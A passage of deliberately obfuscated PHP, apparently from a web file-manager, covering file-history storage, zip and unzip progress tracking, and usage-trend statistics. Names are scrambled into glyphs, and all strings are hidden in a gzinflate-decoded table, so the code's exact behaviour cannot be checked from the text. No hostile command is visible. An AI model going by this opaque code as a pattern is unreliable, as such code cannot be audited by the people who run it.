$¬’˝›úƒ = false) { $˘úüƒ˚– =& $_SERVER[ˆë€Ï⁄∂]; $•…ÂøÍ† = self::fileInfo($ô—ˆ’ÂŸ, $ªœ˝¯πâ); $Ü»¥˙Ñß =& $GLOBALS[$˘úüƒ˚–[7]]; $¬’˝›úƒ = isset($Ü»¥˙Ñß[$˘úüƒ˚–[1294]]) && $Ü»¥˙Ñß[$˘úüƒ˚–[1294]] == 1; if (isset($Ü»¥˙Ñß[$˘úüƒ˚–[33]]) && $Ü»¥˙Ñß[$˘úüƒ˚–[33]] == $˘úüƒ˚–[1345]) { return IO::fileOutImage($•…ÂøÍ†[$˘úüƒ˚–[97]], $Ü»¥˙Ñß[$˘úüƒ˚–[1346]]); } IO::fileOut($•…ÂøÍ†[$˘úüƒ˚–[97]], $¬’˝›úƒ, get_path_this($ô—ˆ’ÂŸ)); } public static function listData($ó–ñœ∆å, $›ëËﬁëå = true) { $âπÏÅøˆ =& $_SERVER[ˆë€Ï⁄∂]; if ($›ëËﬁëå && !IO::exist($ó–ñœ∆å)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ó–ñœ∆å, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ó≤ÿì±Ÿ = self::pathHistory($ó–ñœ∆å); $øÀåÿ§Â = array($âπÏÅøˆ[1344] => $Ó≤ÿì±Ÿ . $âπÏÅøˆ[1331], $âπÏÅøˆ[1343] => rtrim(get_path_father($Ó≤ÿì±Ÿ), $âπÏÅøˆ[8]) . $âπÏÅøˆ[8], $âπÏÅøˆ[456] => array()); $·√±Í∑— = IO::getContent($øÀåÿ§Â[$âπÏÅøˆ[1344]]); if ($·√±Í∑—) { $®∂◊ìﬁµ = json_decode($·√±Í∑—, !0); if (is_array($®∂◊ìﬁµ)) { $øÀåÿ§Â[$âπÏÅøˆ[456]] = $®∂◊ìﬁµ; } } return $øÀåÿ§Â; } private static function saveData($ΩçÔÎ‰, $⁄ ¡à’Ë) { $™‹≠òôõ =& $_SERVER[ˆë€Ï⁄∂]; self::log($™‹≠òôõ[1347] . $ΩçÔÎ‰ . $™‹≠òôõ[84] . count($⁄ ¡à’Ë), $™‹≠òôõ[843]); if ($⁄ ¡à’Ë) { return IO::setContent($ΩçÔÎ‰, json_encode($⁄ ¡à’Ë)); } $´óÊÂﬁ• = IO::pathFather($ΩçÔÎ‰); IO::remove($ΩçÔÎ‰); self::clearEmptyFolder($´óÊÂﬁ•); return !0; } public static function clearEmptyFolder($Ëµ¥òı¥) { $Èıõ¥€◊ =& $_SERVER[ˆë€Ï⁄∂]; if (trim($Ëµ¥òı¥, $Èıõ¥€◊[8]) == trim(self::$_historyBase, $Èıõ¥€◊[8])) { return; } $ÛÁ—Ãıü = IO::pathFather($Ëµ¥òı¥); $¸ú ˛æ† = IO::has($Ëµ¥òı¥, !0); if ($¸ú ˛æ†[$Èıõ¥€◊[251]] > 0 || $¸ú ˛æ†[$Èıõ¥€◊[252]] > 0) { return; } IO::remove($Ëµ¥òı¥); self::clearEmptyFolder($ÛÁ—Ãıü); } private static function getBasePath() { $÷……∞Ÿ¯ =& $_SERVER[ˆë€Ï⁄∂]; $Ëä˛§∞Í = Model($÷……∞Ÿ¯[1348])->get($÷……∞Ÿ¯[1349]); if ($Ëä˛§∞Í) { if (!IO::exist($Ëä˛§∞Í)) { IO::mkdir($Ëä˛§∞Í); } if (get_path_this($Ëä˛§∞Í) == $÷……∞Ÿ¯[1334]) { $•«•∑ﬁº = $÷……∞Ÿ¯[1350] . rand_string(8); @rename($Ëä˛§∞Í, get_path_father($Ëä˛§∞Í) . $÷……∞Ÿ¯[8] . $•«•∑ﬁº); $Ëä˛§∞Í = DATA_PATH . $•«•∑ﬁº . $÷……∞Ÿ¯[8]; file_put_contents(DATA_PATH . $÷……∞Ÿ¯[1281], $÷……∞Ÿ¯[12]); Model($÷……∞Ÿ¯[1348])->set($÷……∞Ÿ¯[1349], $Ëä˛§∞Í); } return $Ëä˛§∞Í; } $Ëä˛§∞Í = DATA_PATH . $÷……∞Ÿ¯[1350] . rand_string(8) . $÷……∞Ÿ¯[8]; $Ëä˛§∞Í = IO::mkdir($Ëä˛§∞Í); $Ëä˛§∞Í = rtrim($Ëä˛§∞Í, $÷……∞Ÿ¯[8]) . $÷……∞Ÿ¯[8]; file_put_contents($Ëä˛§∞Í . $÷……∞Ÿ¯[1281], $÷……∞Ÿ¯[12]); file_put_contents(DATA_PATH . $÷……∞Ÿ¯[1281], $÷……∞Ÿ¯[12]); Model($÷……∞Ÿ¯[1348])->set($÷……∞Ÿ¯[1349], $Ëä˛§∞Í); return $Ëä˛§∞Í; } } goto bªé∑ôŒˆ‹; cöÙÜ»âµñ: define($_SERVER[ˆë€Ï⁄∂][0], $_SERVER[ˆë€Ï⁄∂][1]); $_SERVER[˘„˚ˆ˛–] = explode($_SERVER[ˆë€Ï⁄∂][2], gzinflate(substr($_SERVER[ˆë€Ï⁄∂][3], 10, -8))); function binCheckEq($≠øÂ∏ú´, $˚äíﬂäÄ) { return $≠øÂ∏ú´ == $˚äíﬂäÄ; } goto FÃúΩ≈∞ü√; CπÒîΩè√: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ºØﬂ£Óú =& $_SERVER[ˆë€Ï⁄∂]; parent::startAfter(); Hook::bind($ºØﬂ£Óú[1902], array($this, $ºØﬂ£Óú[1903])); Hook::bind($ºØﬂ£Óú[1293], array($this, $ºØﬂ£Óú[1904])); Hook::bind($ºØﬂ£Óú[1905], array($this, $ºØﬂ£Óú[1906])); $Ù‡ƒúÁµ =& $this->task; $Ù‡ƒúÁµ[$ºØﬂ£Óú[1907]] = $ºØﬂ£Óú[1294]; if (!$Ù‡ƒúÁµ[$ºØﬂ£Óú[1675]]) { $Ù‡ƒúÁµ[$ºØﬂ£Óú[1675]] = LNG($ºØﬂ£Óú[1908]); } } protected function endAfter() { $£€¶Ø€Ó =& $_SERVER[ˆë€Ï⁄∂]; parent::endAfter(); Hook::unbind($£€¶Ø€Ó[1902], array($this, $£€¶Ø€Ó[1903])); Hook::unbind($£€¶Ø€Ó[1293], array($this, $£€¶Ø€Ó[1904])); Hook::unbind($£€¶Ø€Ó[1905], array($this, $£€¶Ø€Ó[1906])); } public function updateAfter() { $Ê˝®∑Ùı =& $_SERVER[ˆë€Ï⁄∂]; $ßÜÄèâø =& $this->task; if (!$ßÜÄèâø[$Ê˝®∑Ùı[1155]] || !$ßÜÄèâø[$Ê˝®∑Ùı[854]]) { if ($ßÜÄèâø[$Ê˝®∑Ùı[1907]] != $Ê˝®∑Ùı[399]) { return; } } if ($ßÜÄèâø[$Ê˝®∑Ùı[1907]] == $Ê˝®∑Ùı[1294]) { $Ô£•∑Øî = 0; if ($ßÜÄèâø[$Ê˝®∑Ùı[1841]]) { $Ô£•∑Øî = $ßÜÄèâø[$Ê˝®∑Ùı[1842]] / $ßÜÄèâø[$Ê˝®∑Ùı[1841]]; } $ßÜÄèâø[$Ê˝®∑Ùı[1789]] = $Ô£•∑Øî * 0.3; } else { if ($ßÜÄèâø[$Ê˝®∑Ùı[1907]] == $Ê˝®∑Ùı[399]) { $Ô£•∑Øî = $ßÜÄèâø[$Ê˝®∑Ùı[1788]] / $ßÜÄèâø[$Ê˝®∑Ùı[1155]]; $ßÜÄèâø[$Ê˝®∑Ùı[1789]] = 0.3 + $Ô£•∑Øî * 0.4; } else { if ($ßÜÄèâø[$Ê˝®∑Ùı[1907]] == $Ê˝®∑Ùı[120]) { $èÓÌ≥˚… = 0; if ($ßÜÄèâø[$Ê˝®∑Ùı[1843]] == $Ê˝®∑Ùı[120]) { $èÓÌ≥˚… = $ßÜÄèâø[$Ê˝®∑Ùı[1842]]; } $Ô£•∑Øî = ($ßÜÄèâø[$Ê˝®∑Ùı[1846]] + $èÓÌ≥˚…) / $ßÜÄèâø[$Ê˝®∑Ùı[854]]; $ßÜÄèâø[$Ê˝®∑Ùı[1789]] = 0.3 + 0.4 + $Ô£•∑Øî * 0.3; } } } if ($ßÜÄèâø[$Ê˝®∑Ùı[1789]] > 0) { $˜ò≤é†ç = timeFloat() - $ßÜÄèâø[$Ê˝®∑Ùı[1791]] - $ßÜÄèâø[$Ê˝®∑Ùı[1794]]; $ßÜÄèâø[$Ê˝®∑Ùı[1795]] = $˜ò≤é†ç * (1 - $ßÜÄèâø[$Ê˝®∑Ùı[1789]]) / $ßÜÄèâø[$Ê˝®∑Ùı[1789]]; } } public function addFile($Â˛◊±££) { $Û≥õöÜÃ =& $_SERVER[ˆë€Ï⁄∂]; $∞Ù“ó˝º =& $this->task; $ò˛—…˘÷ = IO::info($Â˛◊±££); $∞Ù“ó˝º[$Û≥õöÜÃ[1839]] = $ò˛—…˘÷[$Û≥õöÜÃ[32]]; $∞Ù“ó˝º[$Û≥õöÜÃ[1841]] = $ò˛—…˘÷[$Û≥õöÜÃ[89]]; $∞Ù“ó˝º[$Û≥õöÜÃ[1842]] = 0; $∞Ù“ó˝º[$Û≥õöÜÃ[1157]] = $Û≥õöÜÃ[1862]; $∞Ù“ó˝º[$Û≥õöÜÃ[1843]] = $Û≥õöÜÃ[1294]; $∞Ù“ó˝º[$Û≥õöÜÃ[854]] = $ò˛—…˘÷[$Û≥õöÜÃ[89]]; $∞Ù“ó˝º[$Û≥õöÜÃ[1155]] = 1; $È≈Ë—Ø≥ = 0; $∞Ù“ó˝º[$Û≥õöÜÃ[1850]] = array($Û≥õöÜÃ[1851] => $È≈Ë—Ø≥ + 1, $Û≥õöÜÃ[505] => $ò˛—…˘÷[$Û≥õöÜÃ[32]], $Û≥õöÜÃ[97] => $ò˛—…˘÷[$Û≥õöÜÃ[97]], $Û≥õöÜÃ[593] => $ò˛—…˘÷[$Û≥õöÜÃ[593]] ? $ò˛—…˘÷[$Û≥õöÜÃ[593]] : $ò˛—…˘÷[$Û≥õöÜÃ[97]]); $this->update(); } public function zipEvent($®É¬û‡•, $±ˆ’¡†ƒ, $±˛˛©¢¯, $‡°öÇ£¢) { $ÔƒØ¬¥÷ =& $_SERVER[ˆë€Ï⁄∂]; $ÙÌ¿˛õ° =& $this->task; $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[1839]] = get_path_this($±ˆ’¡†ƒ); $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[1841]] = $‡°öÇ£¢; $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[1842]] = $±˛˛©¢¯; $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[1157]] = $®É¬û‡• == $ÔƒØ¬¥÷[1909] ? $ÔƒØ¬¥÷[1910] : $ÔƒØ¬¥÷[1911]; $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[1843]] = $ÔƒØ¬¥÷[12]; $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[854]] = $‡°öÇ£¢; $ÙÌ¿˛õ°[$ÔƒØ¬¥÷[1907]] = $ÔƒØ¬¥÷[399]; $this->update(); } public function unzipAfter($Æ˙ªó¢‡) { $¶§√óô˛ =& $_SERVER[ˆë€Ï⁄∂]; $±äì’ûë =& $this->task; $±äì’ûë[$¶§√óô˛[1907]] = $¶§√óô˛[120]; $Ù√¿˘Ú‰ = IO::infoWithChildren($Æ˙ªó¢‡); $˝§ˆ€∏˙ = 0; $±äì’ûë[$¶§√óô˛[1850]] = array($¶§√óô˛[1851] => $˝§ˆ€∏˙ + 1, $¶§√óô˛[505] => $Ù√¿˘Ú‰[$¶§√óô˛[32]], $¶§√óô˛[97] => $Ù√¿˘Ú‰[$¶§√óô˛[97]], $¶§√óô˛[593] => $Ù√¿˘Ú‰[$¶§√óô˛[593]] ? $Ù√¿˘Ú‰[$¶§√óô˛[593]] : $Ù√¿˘Ú‰[$¶§√óô˛[97]]); if ($Ù√¿˘Ú‰[$¶§√óô˛[33]] == $¶§√óô˛[242]) { $±äì’ûë[$¶§√óô˛[1155]] = 1; } else { $±äì’ûë[$¶§√óô˛[1155]] = $Ù√¿˘Ú‰[$¶§√óô˛[92]][$¶§√óô˛[90]]; } $±äì’ûë[$¶§√óô˛[1157]] = $¶§√óô˛[12]; $±äì’ûë[$¶§√óô˛[1843]] = 0; $±äì’ûë[$¶§√óô˛[1788]] = 0; $±äì’ûë[$¶§√óô˛[1841]] = 0; $±äì’ûë[$¶§√óô˛[1842]] = 0; $±äì’ûë[$¶§√óô˛[1839]] = $¶§√óô˛[12]; $±äì’ûë[$¶§√óô˛[1846]] = 0; $±äì’ûë[$¶§√óô˛[854]] = $Ù√¿˘Ú‰[$¶§√óô˛[89]]; $this->update(); self::log($¶§√óô˛[1912] . json_encode(array($±äì’ûë, $Ù√¿˘Ú‰))); } public function nameParse($⁄Ç®˝¯§) { $ÓòÙÕÏ¥ =& $_SERVER[ˆë€Ï⁄∂]; $íª°ø§∑ =& $this->task; if ($íª°ø§∑[$ÓòÙÕÏ¥[1907]] == $ÓòÙÕÏ¥[1294]) { $íª°ø§∑[$ÓòÙÕÏ¥[1907]] = $ÓòÙÕÏ¥[399]; $íª°ø§∑[$ÓòÙÕÏ¥[1846]] = 0; $íª°ø§∑[$ÓòÙÕÏ¥[854]] = 0; } $˘‘§˝ã¢ = get_path_this($⁄Ç®˝¯§); if (strstr($˘‘§˝ã¢, $ÓòÙÕÏ¥[10])) { $íª°ø§∑[$ÓòÙÕÏ¥[1788]] += 1; $íª°ø§∑[$ÓòÙÕÏ¥[1155]] += 1; } $íª°ø§∑[$ÓòÙÕÏ¥[1839]] = $⁄Ç®˝¯§; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $™¥Ç‡ ≠ =& $_SERVER[ˆë€Ï⁄∂]; parent::startAfter(); Hook::bind($™¥Ç‡ ≠[1913], array($this, $™¥Ç‡ ≠[1903])); Hook::bind($™¥Ç‡ ≠[1905], array($this, $™¥Ç‡ ≠[1906])); $∞¸É‚Ä =& $this->task; $∞¸É‚Ä[$™¥Ç‡ ≠[1907]] = $™¥Ç‡ ≠[1294]; if (!$∞¸É‚Ä[$™¥Ç‡ ≠[1675]]) { $∞¸É‚Ä[$™¥Ç‡ ≠[1675]] = LNG($™¥Ç‡ ≠[1914]); } } protected function endAfter() { $û¨‹Í∂€ =& $_SERVER[ˆë€Ï⁄∂]; parent::endAfter(); Hook::unbind($û¨‹Í∂€[1913], array($this, $û¨‹Í∂€[1903])); Hook::unbind($û¨‹Í∂€[1905], array($this, $û¨‹Í∂€[1906])); } public function updateAfter() { $≠±¶®π± =& $_SERVER[ˆë€Ï⁄∂]; $è¯Ë·ã» =& $this->task; if (!$è¯Ë·ã»[$≠±¶®π±[1155]] || !$è¯Ë·ã»[$≠±¶®π±[854]]) { return; } if ($è¯Ë·ã»[$≠±¶®π±[1907]] == $≠±¶®π±[1294]) { $‹◊˙‡ÜÎ = $è¯Ë·ã»[$≠±¶®π±[1842]]; if ($è¯Ë·ã»[$≠±¶®π±[1843]] != $≠±¶®π±[1294]) { $‹◊˙‡ÜÎ = 0; } $˙÷Ë∂¿› = ($è¯Ë·ã»[$≠±¶®π±[1846]] + $‹◊˙‡ÜÎ) / $è¯Ë·ã»[$≠±¶®π±[854]]; $è¯Ë·ã»[$≠±¶®π±[1789]] = $˙÷Ë∂¿› * 0.3; } else { if ($è¯Ë·ã»[$≠±¶®π±[1907]] == $≠±¶®π±[399]) { $˙÷Ë∂¿› = $è¯Ë·ã»[$≠±¶®π±[1788]] / $è¯Ë·ã»[$≠±¶®π±[1155]]; $è¯Ë·ã»[$≠±¶®π±[1789]] = 0.3 + $˙÷Ë∂¿› * 0.5; } else { if ($è¯Ë·ã»[$≠±¶®π±[1907]] == $≠±¶®π±[120]) { $˙÷Ë∂¿› = 0; if ($è¯Ë·ã»[$≠±¶®π±[1841]]) { $˙÷Ë∂¿› = $è¯Ë·ã»[$≠±¶®π±[1842]] / $è¯Ë·ã»[$≠±¶®π±[1841]]; } $è¯Ë·ã»[$≠±¶®π±[1789]] = 0.3 + 0.5 + $˙÷Ë∂¿› * 0.2; } } } if ($è¯Ë·ã»[$≠±¶®π±[1789]] > 0) { $µ©©§Ùπ = timeFloat() - $è¯Ë·ã»[$≠±¶®π±[1791]] - $è¯Ë·ã»[$≠±¶®π±[1794]]; $è¯Ë·ã»[$≠±¶®π±[1795]] = $µ©©§Ùπ * (1 - $è¯Ë·ã»[$≠±¶®π±[1789]]) / $è¯Ë·ã»[$≠±¶®π±[1789]]; } } public function copyFileStart($´ÍúÎùÚ, $…çóÿ≥¶, $Øñ∑…‰Û, $úº„È®ó, $∆Î„ùæ⁄, $≈£Èú€’) { $ÑìÈÅø• =& $_SERVER[ˆë€Ï⁄∂]; parent::copyFileStart($´ÍúÎùÚ, $…çóÿ≥¶, $Øñ∑…‰Û, $úº„È®ó, $∆Î„ùæ⁄, $≈£Èú€’); $ÊÙº®«¢ =& $this->task; if ($ÊÙº®«¢[$ÑìÈÅø•[1907]] == $ÑìÈÅø•[399]) { $ÊÙº®«¢[$ÑìÈÅø•[1907]] = $ÑìÈÅø•[120]; } $this->update(); } public function copyFileEnd($˚ÂÑ‚ß¿, $ÚÒí¡ì∞, $óÙÁˆß£, $ôéä—µî, $ ÏŸ˛È†, $√«Ç·ê») { $ Ú®ñ£≈ =& $_SERVER[ˆë€Ï⁄∂]; $ŸóŸ™êÃ =& $this->task; $ŸóŸ™êÃ[$ Ú®ñ£≈[1842]] = $ŸóŸ™êÃ[$ Ú®ñ£≈[1841]]; $ŸóŸ™êÃ[$ Ú®ñ£≈[1846]] += $ŸóŸ™êÃ[$ Ú®ñ£≈[1841]]; $ŸóŸ™êÃ[$ Ú®ñ£≈[1843]] = $ Ú®ñ£≈[12]; $this->update(); } public function zipEvent($ë„ßÎÂß, $ÉèË»Â†, $Êª∫≤¸Í, $î≥ÀÕÙâ) { $ïÎí¡”æ =& $_SERVER[ˆë€Ï⁄∂]; $£–ÂæçÊ =& $this->task; $£–ÂæçÊ[$ïÎí¡”æ[1839]] = get_path_this($ÉèË»Â†); $£–ÂæçÊ[$ïÎí¡”æ[1841]] = $î≥ÀÕÙâ; $£–ÂæçÊ[$ïÎí¡”æ[1842]] = $Êª∫≤¸Í; $£–ÂæçÊ[$ïÎí¡”æ[1157]] = $ë„ßÎÂß == $ïÎí¡”æ[1915] ? $ïÎí¡”æ[1910] : $ïÎí¡”æ[1911]; $£–ÂæçÊ[$ïÎí¡”æ[1843]] = $ïÎí¡”æ[12]; $£–ÂæçÊ[$ïÎí¡”æ[854]] = $î≥ÀÕÙâ; $£–ÂæçÊ[$ïÎí¡”æ[1907]] = $ïÎí¡”æ[399]; $this->update(); } public function nameParse($≈√¥ó–Ó) { $›¨˝◊±ó =& $_SERVER[ˆë€Ï⁄∂]; $¸Ãº∑Ë =& $this->task; if ($¸Ãº∑Ë[$›¨˝◊±ó[1788]] < $¸Ãº∑Ë[$›¨˝◊±ó[1155]]) { $”ÉÙ‰™® = get_path_this($≈√¥ó–Ó); if (strstr($”ÉÙ‰™®, $›¨˝◊±ó[10])) { $¸Ãº∑Ë[$›¨˝◊±ó[1788]] += 1; } } if ($¸Ãº∑Ë[$›¨˝◊±ó[1907]] == $›¨˝◊±ó[1294]) { $¸Ãº∑Ë[$›¨˝◊±ó[1907]] = $›¨˝◊±ó[399]; } $¸Ãº∑Ë[$›¨˝◊±ó[1839]] = $≈√¥ó–Ó; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÿ≥Ûû‘°) { $˝Â˙“ı® =& $_SERVER[ˆë€Ï⁄∂]; $üΩ¢Îò∞ = array($˝Â˙“ı®[676] => array($˝Â˙“ı®[33] => $˝Â˙“ı®[1916], $˝Â˙“ı®[361] => array($˝Â˙“ı®[294], $˝Â˙“ı®[856], $˝Â˙“ı®[1917], $˝Â˙“ı®[1918])), $˝Â˙“ı®[1919] => array($˝Â˙“ı®[33] => $˝Â˙“ı®[1920], $˝Â˙“ı®[361] => array($˝Â˙“ı®[294], $˝Â˙“ı®[854], $˝Â˙“ı®[1921], $˝Â˙“ı®[1922], $˝Â˙“ı®[1923]))); if (!isset($üΩ¢Îò∞[$ÿ≥Ûû‘°])) { return !1; } $this->optionType = $üΩ¢Îò∞[$ÿ≥Ûû‘°][$˝Â˙“ı®[33]]; $this->field = $üΩ¢Îò∞[$ÿ≥Ûû‘°][$˝Â˙“ı®[361]]; return !0; } public function listData($ÙŒ¡ÍÊü = false, $´¬¯œçä = "\155\157\x64\x69\146\x79\x54\151\x6d\145", $‡ÉåÍà‘ = false) { return parent::listData($ÙŒ¡ÍÊü, $´¬¯œçä, $‡ÉåÍà‘); } public function trendList($îü∞Ò¶ø) { $Ç‘ﬂÂè =& $_SERVER[ˆë€Ï⁄∂]; $±Ñ‰Èéì = $this->listData(); if ($±Ñ‰Èéì) { $£ÏÍÅÃı = end($±Ñ‰Èéì); $˚ΩäÑû∞ = date($Ç‘ﬂÂè[1924], strtotime($Ç‘ﬂÂè[1925])); if ($£ÏÍÅÃı[$Ç‘ﬂÂè[294]] == $˚ΩäÑû∞) { return $±Ñ‰Èéì; } $“ô◊˙àê = strtotime($£ÏÍÅÃı[$Ç‘ﬂÂè[294]]); } if (!isset($“ô◊˙àê)) { $ÊÅÙ≥˙µ = $îü∞Ò¶ø == $Ç‘ﬂÂè[676] ? $Ç‘ﬂÂè[608] : $Ç‘ﬂÂè[916]; $“ô◊˙àê = Model($ÊÅÙ≥˙µ)->min($Ç‘ﬂÂè[243]); } $ìÍ ‡õµ = $Ç‘ﬂÂè[1926] . ucfirst($îü∞Ò¶ø); $‚≠™Ô›Ê = $this->dateList($“ô◊˙àê); foreach ($‚≠™Ô›Ê as $˚ΩäÑû∞) { $this->{$ìÍ ‡õµ}($˚ΩäÑû∞); } return $this->listData(); } private function dateList($Ù£›ì ﬂ) { $ è∆Ÿõë =& $_SERVER[ˆë€Ï⁄∂]; $’È¶™◊¸ = $Ù£›ì ﬂ; $ºó“Ï¨Ü = strtotime($ è∆Ÿõë[1925]); $ÁË˚¢∆ñ = array(); while ($’È¶™◊¸ <= $ºó“Ï¨Ü) { $ÁË˚¢∆ñ[] = date($ è∆Ÿõë[1924], $’È¶™◊¸); $’È¶™◊¸ = strtotime($ è∆Ÿõë[1927], $’È¶™◊¸); } return $ÁË˚¢∆ñ; } public function _recordUser($¬˜£∏ÑÒ = '') { $–À›Ù…ß =& $_SERVER[ˆë€Ï⁄∂]; $π˜ÍﬂÆ¥ = strtotime(date($–À›Ù…ß[1928], strtotime($¬˜£∏ÑÒ))); $∏€¥˚Åò = strtotime(date($–À›Ù…ß[1929], strtotime($¬˜£∏ÑÒ))); $ªáó€úÁ = array($–À›Ù…ß[243] => array($–À›Ù…ß[1105], $∏€¥˚Åò)); $Ø®‰ƒÒœ = Model($–À›Ù…ß[608])->where($ªáó€úÁ)->count($–À›Ù…ß[1787]); $ªáó€úÁ[$–À›Ù…ß[243]] = array($–À›Ù…ß[419], array($π˜ÍﬂÆ¥, $∏€¥˚Åò)); $∞∫Çô∑Ø = Model($–À›Ù…ß[608])->where($ªáó€úÁ)->count($–À›Ù…ß[1787]); $ªáó€úÁ[$–À›Ù…ß[33]] = $–À›Ù…ß[1930]; $¡ù¬‡Â„ = Model($–À›Ù…ß[1931])->where($ªáó€úÁ)->count($–À›Ù…ß[1932]); $ÃÌØÆ¶û = array($–À›Ù…ß[294] => $¬˜£∏ÑÒ, $–À›Ù…ß[856] => (int) $Ø®‰ƒÒœ, $–À›Ù…ß[1917] => (int) $∞∫Çô∑Ø, $–À›Ù…ß[1918] => (int) $¡ù¬‡Â„); return $this->insert($ÃÌØÆ¶û); } public function _recordStore($ïÍµæ¯∞ = '') { $ùôØë„ﬂ =& $_SERVER[ˆë€Ï⁄∂]; $ç“¥ß‡ï = strtotime(date($ùôØë„ﬂ[1929], strtotime($ïÍµæ¯∞))); $Ë¡Òü¨Â = array($ùôØë„ﬂ[243] => array($ùôØë„ﬂ[1105], $ç“¥ß‡ï)); $≈Ù÷æ¥ÿ = Model($ùôØë„ﬂ[555])->where($Ë¡Òü¨Â)->sum($ùôØë„ﬂ[89]); $Ë¡Òü¨Â[$ùôØë„ﬂ[496]] = 0; $Æõ£∂¸· = Model($ùôØë„ﬂ[916])->where($Ë¡Òü¨Â)->sum($ùôØë„ﬂ[89]); $Ë¡Òü¨Â[$ùôØë„ﬂ[200]] = 1; $—ﬁ€ú¡Î = Model($ùôØë„ﬂ[916])->where($Ë¡Òü¨Â)->sum($ùôØë„ﬂ[89]); $Ë¡Òü¨Â[$ùôØë„ﬂ[200]] = 2; $‚∑¬€ı¸ = Model($ùôØë„ﬂ[916])->where($Ë¡Òü¨Â)->sum($ùôØë„ﬂ[89]); $®Ò≤ÑúÂ = array($ùôØë„ﬂ[294] => $ïÍµæ¯∞, $ùôØë„ﬂ[854] => (int) $Æõ£∂¸·, $ùôØë„ﬂ[1921] => (int) $≈Ù÷æ¥ÿ, $ùôØë„ﬂ[1922] => (int) $—ﬁ€ú¡Î, $ùôØë„ﬂ[1923] => (int) $‚∑¬€ı¸); return $this->insert($®Ò≤ÑúÂ); } public function trend($£›Œõ¨≈, $ö„Ÿá≈Õ) { $◊ºï·ˆ‘ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->init($£›Œõ¨≈)) { return !1; } $ÿ‘º§ﬁ⁄ = $this->trendList($£›Œõ¨≈); if ($ÿ‘º§ﬁ⁄ && $ö„Ÿá≈Õ != $◊ºï·ˆ‘[1759]) { $ëÛ°⁄®≤ = $ÿ‘º§ﬁ⁄[0][$◊ºï·ˆ‘[294]]; $Û±‡∫äö = $this->validDate($ö„Ÿá≈Õ, $ëÛ°⁄®≤); $ﬁêÃüΩ = array(); $ÜöÉ„æ• = array_to_keyvalue($ÿ‘º§ﬁ⁄, $◊ºï·ˆ‘[294]); foreach ($Û±‡∫äö as $î´Ù§ùÅ) { if (isset($ÜöÉ„æ•[$î´Ù§ùÅ])) { $·…©¸Â“ = $ÜöÉ„æ•[$î´Ù§ùÅ]; } else { $·…©¸Â“ = end($ÿ‘º§ﬁ⁄); $·…©¸Â“[$◊ºï·ˆ‘[294]] = $î´Ù§ùÅ; if ($£›Œõ¨≈ == $◊ºï·ˆ‘[676]) { $·…©¸Â“[$◊ºï·ˆ‘[1917]] = $·…©¸Â“[$◊ºï·ˆ‘[1918]] = 0; } } $ﬁêÃüΩ[] = $·…©¸Â“; } $ÿ‘º§ﬁ⁄ = $ﬁêÃüΩ; } $†Ë÷¶Æö = array($◊ºï·ˆ‘[676] => array($◊ºï·ˆ‘[856] => LNG($◊ºï·ˆ‘[1933]), $◊ºï·ˆ‘[1917] => LNG($◊ºï·ˆ‘[1934]), $◊ºï·ˆ‘[1918] => LNG($◊ºï·ˆ‘[1935])), $◊ºï·ˆ‘[1919] => array($◊ºï·ˆ‘[854] => LNG($◊ºï·ˆ‘[1936]), $◊ºï·ˆ‘[1921] => LNG($◊ºï·ˆ‘[1937]), $◊ºï·ˆ‘[1922] => LNG($◊ºï·ˆ‘[1938]), $◊ºï·ˆ‘[1923] => LNG($◊ºï·ˆ‘[1939]))); $Õí††Ÿ÷ = array($◊ºï·ˆ‘[676] => $◊ºï·ˆ‘[1940], $◊ºï·ˆ‘[1919] => $◊ºï·ˆ‘[89]); if (empty($ÿ‘º§ﬁ⁄)) { $î´Ù§ùÅ = date($◊ºï·ˆ‘[1924], strtotime($◊ºï·ˆ‘[1925])); $–´Õ÷¸Ò = array($◊ºï·ˆ‘[294] => $î´Ù§ùÅ); foreach ($†Ë÷¶Æö[$£›Œõ¨≈] as $©üé‹ﬂË => $Ø∏∞Õ¥É) { $–´Õ÷¸Ò[$©üé‹ﬂË] = 0; } $ÿ‘º§ﬁ⁄[] = $–´Õ÷¸Ò; } $Û¡È˘à  = array(); foreach ($ÿ‘º§ﬁ⁄ as $Ø∏∞Õ¥É) { if ($£›Œõ¨≈ == $◊ºï·ˆ‘[1919] && $Ø∏∞Õ¥É[$◊ºï·ˆ‘[1921]] > $Ø∏∞Õ¥É[$◊ºï·ˆ‘[854]]) { $Ø∏∞Õ¥É[$◊ºï·ˆ‘[1921]] = $Ø∏∞Õ¥É[$◊ºï·ˆ‘[854]]; } foreach ($†Ë÷¶Æö[$£›Œõ¨≈] as $©üé‹ﬂË => $’Ü¢”®≥) { $·…©¸Â“ = array($◊ºï·ˆ‘[294] => $Ø∏∞Õ¥É[$◊ºï·ˆ‘[294]], $◊ºï·ˆ‘[1675] => $’Ü¢”®≥); $·…©¸Â“[$Õí††Ÿ÷[$£›Œõ¨≈]] = isset($Ø∏∞Õ¥É[$©üé‹ﬂË]) ? $Ø∏∞Õ¥É[$©üé‹ﬂË] : 0; $Û¡È˘à [] = $·…©¸Â“; } } return $Û¡È˘à ; } public function validDate($¡‚Ÿ˘ÁÚ, $ﬂÒÃ˚≥ƒ) { $≈È≤Úﬁ¢ =& $_SERVER[ˆë€Ï⁄∂]; $∆™∆ÕÄ = date($≈È≤Úﬁ¢[1924], strtotime($≈È≤Úﬁ¢[1925])); $ë»Ï›øø = array($∆™∆ÕÄ); switch ($¡‚Ÿ˘ÁÚ) { case $≈È≤Úﬁ¢[1766]: $ÙÙ∂ˆ®è = mktime(0, 0, 0, date($≈È≤Úﬁ¢[1941]), date($≈È≤Úﬁ¢[1467]) - date($≈È≤Úﬁ¢[1557]) + 7 - 7, date($≈È≤Úﬁ¢[1942])); $–‘±÷„ = 0; do { $¨“≥ö‹ö = date($≈È≤Úﬁ¢[1924], $ÙÙ∂ˆ®è - 3600 * 24 * 7 * $–‘±÷„); $ë»Ï›øø[] = $¨“≥ö‹ö; $–‘±÷„++; } while ($ﬂÒÃ˚≥ƒ < $¨“≥ö‹ö); break; case 